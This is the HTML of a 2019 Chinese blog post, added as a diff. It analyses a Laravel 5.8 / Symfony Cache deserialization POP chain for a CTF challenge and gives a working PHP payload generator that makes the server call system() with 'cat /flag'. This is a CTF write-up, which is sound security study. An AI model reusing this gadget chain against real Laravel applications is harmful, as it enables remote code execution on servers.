@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="laravel5.8反序列化漏洞分析"/>
+
+
+
+
+  <meta name="keywords" content="php代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2019/11/05/laravel5-8反序列化漏洞分析/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="laravel5.8反序列化漏洞分析">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/05/laravel5-8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/2GN7drpVj6DxAzo.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/CD6UvNQoTRpHmuE.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/avxo4iUrmeKhBGH.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/N7VL95fsyqvUFID.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/kTxGprtV8eEfWqD.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/06/FWcIY9TUxrLBHoV.png">
+<meta property="article:published_time" content="2019-11-05T08:37:02.000Z">
+<meta property="article:modified_time" content="2020-03-28T02:01:04.787Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="php代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/06/2GN7drpVj6DxAzo.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> laravel5.8反序列化漏洞分析 - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          laravel5.8反序列化漏洞分析
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 05 2019
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#漏洞搭建">漏洞搭建</a></li>
+<li><a href="#漏洞分析">漏洞分析</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<h4><span id="漏洞搭建">漏洞搭建</span></h4><p>做buuoj的时候遇到的 - <strong>[CISCN2019 总决赛 Day1 Web4]Laravel1</strong></p>
+<blockquote>
+<p>有个非预期，payload留在logs中，因为laravel存在</p>
+</blockquote>
+<p>laravel5.8</p>
+<h4><span id="漏洞分析">漏洞分析</span></h4><p>存在反序列化，那么难点就是寻找POP链</p>
+<p>全局搜索<code>__destruct()</code>，有很多，但是经验多了判断起来就快了。。。</p>
+<p>我直接看存在POP链的地方</p>
+<p><code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code></p>
+<p><img src="https://i.loli.net/2019/11/06/2GN7drpVj6DxAzo.png" alt="Snipaste_2019-11-06_08-12-17.png"></p>
+<p>跟踪<code>invalidateTags()</code></p>
+<p><img src="https://i.loli.net/2019/11/06/CD6UvNQoTRpHmuE.png" alt="Snipaste_2019-11-06_08-21-33.png"></p>
+<p>跟踪<code>$this-&gt;pool</code>，这是一个我们可控的变量，那么全局搜索<code>saveDeferred()</code></p>
+<p>感觉<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code>可能有戏</p>
+<p><img src="https://i.loli.net/2019/11/06/avxo4iUrmeKhBGH.png" alt="Snipaste_2019-11-06_08-29-11.png"></p>
+<p>跟踪<code>doSave()</code></p>
+<p><img src="https://i.loli.net/2019/11/06/N7VL95fsyqvUFID.png" alt="Snipaste_2019-11-06_08-30-49.png"></p>
+<p>存在动态调用，这里可以用<code>system()</code>，最多两个参数</p>
+<p><img src="https://i.loli.net/2019/11/06/kTxGprtV8eEfWqD.png" alt="Snipaste_2019-11-06_08-45-24.png"></p>
+<p>那么分析变量</p>
+<p><code>$this-&gt;setInnerItem</code>可控，<code>$innerItem</code>是我们传入的<code>$item</code>类中的<code>$innerItem</code>属性</p>
+<p>引用七月火师傅的话</p>
+<blockquote>
+<p> 首先，程序将 <strong>$item</strong> 类强转成数组（上图 <strong>第207行</strong> ），然后再从数组中取值作为下面动态调用函数的参数（上图 <strong>第213行</strong> ）。这里可以看到有 <strong>$item[“\0*\0expiry”]</strong>、<strong>$item[“\0*\0poolHash”]</strong> 这种写法，数组键名带有 <strong>\0*\0</strong> 。这实际上是类中，修饰符为 <strong>protected</strong> 的属性，在类强转成数组之后的结果。 </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/06/FWcIY9TUxrLBHoV.png" alt="Snipaste_2019-11-06_08-56-16.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!$item instanceof CacheItem) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>实例化一个绕过即可</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">	private $setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">	public $deferred &#x3D; [];</span><br><span class="line">	public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    	$this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+
+<p><strong>自己踩了几个坑，对php语法掌握不熟练</strong></p>
+<p><code>private $deferred = array();</code>需要修改成<code>public $deferred = array();</code></p>
+<p><code>class ProxyAdapter implements AdapterInterface, CacheInterface, PruneableInterface, ResettableInterface</code>实现的接口不需要写</p>
+<p><code>public $deferred = array(&#39;aa&#39;=&gt;new \Symfony\Component\Cache\CacheItem);</code>在类中这种写法不允许， 类（对象）的属性是不能用非常量来初始化的！ 非常量是指变量，或函数返回值等 </p>
+<p><strong>看wp的时候看到szs， 利用<code>highlight_file(&#39;/flag&#39;,null)</code> ，但是这里第二个参数<code>$item</code>要为null，似乎不好构造</strong></p>
+<p>最后整理下POP链</p>
+<p><code>TagAwareAdapter.php</code>-&gt;<code>__destruct()</code>-&gt;<code>commit()</code>-&gt;<code>invalidateTags()</code>-&gt;<code>$this-&gt;pool-&gt;saveDeferred($item)</code></p>
+<p><code>ProxyAdapter.php</code>-&gt;<code>saveDeferred()</code>-&gt;<code>doSave()</code>-&gt;<code>($this-&gt;setInnerItem)($innerItem, $item)</code></p>
+<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/5911#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5911#toc-2</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> php代码审计</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2019/11/07/phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">phpcms_v9.6.0任意文件上传漏洞分析</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/09/19/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/">
+        <span class="next-text nav-default">zzzphp1.7.0远程代码执行分析</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
